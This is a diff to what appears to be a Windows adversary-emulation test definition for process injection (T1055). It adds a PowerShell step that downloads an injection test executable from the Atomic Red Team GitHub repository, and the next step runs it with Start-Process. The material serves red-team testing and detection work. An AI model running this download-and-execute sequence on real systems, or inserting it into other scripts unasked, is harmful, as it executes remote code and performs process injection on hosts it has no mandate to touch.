@@ -22,6 +22,13 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        Portable Executable to inject must exist at specified location (#{exe_binary})
+      inline: |
+        if (Test-Path "#{exe_binary}") {exit 0} else {{New-Item -Type Directory (split-path "#{exe_binary}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/bin/x64/uuid_injection.exe" -OutFile "#{exe_binary}"
+        }}
+      executor: powershell
     - name: uuid-custom-process-injection
       inline: |-
         Start-Process "{{.Args.exe_binary}}"
